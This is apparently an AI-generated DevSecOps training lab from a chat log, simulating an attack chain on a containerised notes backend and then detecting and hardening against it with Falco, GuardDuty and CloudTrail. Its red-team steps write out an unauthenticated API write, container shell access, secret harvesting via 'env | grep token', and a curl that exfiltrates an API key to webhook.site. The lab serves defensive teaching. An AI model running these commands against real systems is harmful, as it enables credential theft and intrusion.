# 🧨 Week 18 – Guided Lab: Simulated Attack Chain & Blue Team Defense

---

## 🎯 Scenario

An alert from Falco flags a suspicious outbound connection from the `notes-backend` container.  
You’ll simulate an attack (Red Team) and trace, defend, and patch it (Blue Team).

---

## 🧪 Red Team Phase (Simulated Attack)

### 🛠️ Step 1: Exploit Weak Authentication (OWASP A2: Broken Auth)

```bash
# Attempt to POST a note without an Authorization header
curl -X POST http://<BACKEND_URL>:3000/api/notes \
     -H "Content-Type: application/json" \
     -d '{"title": "Hacked", "content": "This was injected"}'
🔍 Command Breakdown:
-X POST: Specifies HTTP POST method

-H: Sets a custom request header

-d: Sends raw JSON data as request body

✅ Expected:
Backend accepts request without validating JWT → broken authentication

🧠 DevSecOps Tie-In:
CI pipeline should include automated API security tests

Authorization should be enforced in middleware, tested at build

🛠️ Step 2: Simulate Container Access (via ECS Exec or kubectl exec)
# ECS example: Connect to container
aws ecs execute-command \
    --cluster notes-dev \
    --task <task-id> \
    --container notes-backend \
    --command "/bin/sh" \
    --interactive
🔍 Command Breakdown:
--cluster: Name of ECS cluster

--task: Target task ID

--container: Container to connect to

--command: Shell to run

--interactive: Keeps session open

📌 Or use kubectl exec -it pod-name -- /bin/sh for K8s.

✅ Expected:
Shell access into container

🧠 Real-World Risk:
Compromised container = attacker beachhead

If IAM roles or secrets are over-permissive → lateral movement possible

🛠️ Step 3: Extract Environment Variables
# Look for secrets in environment variables
env | grep -i token
🔍 Explanation:
env: Lists all environment variables

grep -i: Case-insensitive search for word “token”

✅ Expected:
Tokens, DB URIs, API keys appear in plain text

🧠 DevSecOps Fix:
Replace env-based secrets with mount-based secrets from Vault, AWS Secrets Manager, or Kubernetes secrets

🛠️ Step 4: Try Lateral Movement
# Attempt to access a sibling service in staging namespace
curl http://search.staging.local:3000/health
🔍 Explanation:
Targets internal service via DNS

Tests if cross-env isolation is broken

🧠 Policy Fix:
ECS: Use Service Connect namespaces and deny dev → staging calls

K8s: Apply NetworkPolicies to isolate services per namespace

🛠️ Step 5: Simulate Data Exfiltration
# Simulate exfiltrating a secret using curl
curl -X POST https://webhook.site/your-id \
     -d "leaked_token=$(cat /secrets/api-key)"
🔍 Explanation:
-X POST: Send HTTP POST

-d: Include file contents as request payload

✅ Expected:
Secret posted to external server

🧠 DevSecOps Control:
Runtime detection (Falco, eBPF)

Egress control via iptables, NetworkPolicy, or ECS security group

🛡️ Blue Team Phase (Defense)
🔎 Step 6: Detect with Falco
Falco rule catches reverse shell or netcat call:

# ECS EC2 or Kubernetes log
kubectl logs falco-pod -n falco | grep "Outbound connection"
✅ Expected:
Log line with "Outbound connection detected"

🧠 Why It Matters:
Falco watches for syscall patterns that indicate abnormal behavior (e.g., bash, nc, unexpected DNS)

🔎 Step 7: Detect with GuardDuty
# List findings with severity > 7
aws guardduty get-findings \
    --detector-id <id> \
    --query "findings[?severity>=7]"
🔍 Explanation:
--detector-id: ID of GuardDuty instance

--query: Filters results with JMESPath

✅ Expected:
Findings for UnauthorizedAccess, Recon, or Exfiltration

🔎 Step 8: Audit CloudTrail & IAM Misuse
# List recent API calls
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=<compromised-role> \
    --max-results 10
🔐 Step 9: Apply Fixes & Hardening
Issue	Fix
Weak auth	Add JWT middleware + automated tests
Secrets in env	Migrate to secret manager or Vault
No egress restriction	Add NetworkPolicy (K8s) or Service Connect (ECS) +
scoped SGs	
IAM too permissive	Refactor with IAM Access Analyzer
No alerting	Integrate Falco and GuardDuty into Slack/SIEM
Insecure container	Rebuild with non-root user, read-only FS, DROP CAP_SYS_ADMIN
🧠 MITRE Mapping
Tactic	Technique	Simulation Step
Initial Access	T1190 – Exploit Public-Facing App	Step 1
Execution	T1059 – Command and Scripting Interpreter	Step 2
Credential Access	T1552 – Unprotected Secrets	Step 3
Lateral Movement	T1021 – Remote Services	Step 4
Exfiltration	T1041 – Exfil via Command & Control	Step 5
Defense Evasion	T1562 – Disable/Bypass Security Tools	(Optional)
✅ Completion Checklist
✅	Task
Simulated weak auth attack	
Gained shell access to container	
Dumped env secrets	
Accessed sibling service	
Exfiltrated data externally	
Detected attack via Falco & GuardDuty	
Applied hardening measures	
Mapped scenario to MITRE ATT&CK	
Wrote or extended your own Falco rule (optional)	
📦 Output Artifacts
falco-alert.log

cloudtrail-events.json

guardduty-findings.json

exfil-test.webhook.txt

post-mitigation-checklist.md

🔚 Final Note
This lab is a turning point: You didn’t just build a secure pipeline — you challenged it like an attacker, then patched it like a DevSecOps lead. 💥


---

Let me know when you’re ready to move into the **Challenge Lab**, where you’ll design and execute your own red team scenario end-to-end, produce artifacts, and improve your stack even further.
You said:
Ready 
ChatGPT said:
Great — let’s dive into the Week 18 Challenge Lab, where you’ll build your own attack-defense simulation, using real-world tooling and generating security artifacts along the way.